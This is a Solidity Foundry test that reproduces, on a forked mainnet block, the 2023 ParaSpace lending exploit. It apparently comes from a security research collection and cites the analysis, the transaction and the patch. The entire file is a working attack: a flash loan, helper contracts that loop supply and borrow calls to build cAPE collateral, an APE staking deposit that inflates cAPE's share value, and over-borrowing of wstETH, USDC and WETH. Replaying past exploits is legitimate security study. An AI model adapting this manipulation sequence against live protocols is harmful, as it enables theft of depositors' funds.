// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1636650252844294144
// @TX
// https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a
// @Update
// https://docs.para.space/para-space/protocol-security-and-external-audits/withdrawal-and-borrow-timelock
// https://twitter.com/ParaSpace_NFT/status/1639593663469875205
// code: https://github.com/para-space/paraspace-core/pull/368/files

interface IParaProxy {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

    function borrow(address asset, uint256 amount, uint16 referralCode, address onBehalfOf) external;
}

interface IAPEStaking {
    function depositApeCoin(uint256 _amount, address _recipient) external;
}

contract ContractTest is Test {
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 cAPE = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);
    IERC20 APE = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IParaProxy ParaProxy = IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IAPEStaking APEStaking = IAPEStaking(0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9);
    IAaveFlashloan AaveFlashloan = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    Slave slave;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_845_558);
        vm.label(address(wstETH), "wstETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(cAPE), "cAPE");
        vm.label(address(APE), "APE");
        vm.label(address(WETH), "WETH");
        vm.label(address(ParaProxy), "ParaProxy");
        vm.label(address(Router), "Router");
        vm.label(address(APEStaking), "APEStaking");
        vm.label(address(AaveFlashloan), "AaveFlashloan");
    }

    function testExploit() external {
        console.log("1 FlashLoan wstETH");
        AaveFlashloan.flashLoanSimple(address(this), address(wstETH), 47_352_823_905_004_708_422_332, new bytes(0), 0);

        emit log_named_decimal_uint(
            "After exploit, WETH balance of Attacker:", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external returns (bool) {
        wstETH.approve(address(AaveFlashloan), type(uint256).max);
        cAPE.approve(address(ParaProxy), type(uint256).max);
        uint256 _amountOfShare = 1_840_000_000_000_000_000_000_000;
        uint256 transferAmount = 6_039_513_998_943_475_964_078;
        uint256 otherAmount = 3_676_225_912_400_376_673_786;
        for (uint256 i; i < 7; ++i) {
            if (i == 6) {
                transferAmount = otherAmount;
                _amountOfShare = 1_120_000_000_000_000_000_000_000;
            }
            slave = new Slave();
            wstETH.transfer(address(slave), transferAmount);
            slave.remove(_amountOfShare);
            ParaProxy.supply(address(cAPE), cAPE.balanceOf(address(this)), address(this), 0);
            console.log(i + 2, "Create a new contract to replace wstETH with cAPE as collateral deposit in paraspace");
        }
        console.log("9 Swap wstETH to APE");
        _amountOfShare = 1_840_000_000_000_000_000_000_000;
        transferAmount = 6_039_513_998_943_475_964_078;
        slave = new Slave();
        wstETH.transfer(address(slave), transferAmount);
        slave.remove(_amountOfShare);
        SwapwstETHToAPE();
        cAPE.withdraw(cAPE.balanceOf(address(this)));
        console.log("10 deposit APE to APEStaking, manipulate borrowable assets");
        APE.approve(address(APEStaking), type(uint256).max);
        APEStaking.depositApeCoin(APE.balanceOf(address(this)), address(cAPE));
        console.log("11 borrow asset from paraspace");
        ParaProxy.borrow(address(wstETH), 44_952_823_905_004_708_422_332, 0, address(this));
        ParaProxy.borrow(address(USDC), 7_200_000_000_000, 0, address(this));
        ParaProxy.borrow(address(WETH), 1_200_000_000_000_000_000_000, 0, address(this));
        console.log("12 swap USDC and WETH -> wstETH to repay flashLoan");
        WETH_USDCTowstETH(amount, premium);
        return true;
    }

    function SwapwstETHToAPE() internal {
        wstETH.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _Param1 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(wstETH),
            tokenOut: address(WETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: 1_400_000_000_000_000_000_000,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Param1);
        WETH.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _Param2 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(APE),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: WETH.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Param2);
    }

    function WETH_USDCTowstETH(uint256 amount, uint256 premium) internal {
        USDC.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _Param1 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(WETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        WETH.approve(address(Router), type(uint256).max);
        uint256 amountout = amount + premium - wstETH.balanceOf(address(this));
        Router.exactInputSingle(_Param1);
        Uni_Router_V3.ExactOutputSingleParams memory _Param2 = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(wstETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: amountout,
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_Param2);
    }
}

contract Slave {
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 cAPE = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);
    IParaProxy ParaProxy = IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee);
    address owner;

    constructor() {
        owner = msg.sender;
        wstETH.approve(address(ParaProxy), type(uint256).max);
    }

    function remove(uint256 _amountOfShares) external {
        ParaProxy.supply(address(wstETH), wstETH.balanceOf(address(this)), address(this), 0);
        ParaProxy.borrow(address(cAPE), _amountOfShares, 0, address(this));
        cAPE.transfer(owner, cAPE.balanceOf(address(this)));
    }
}
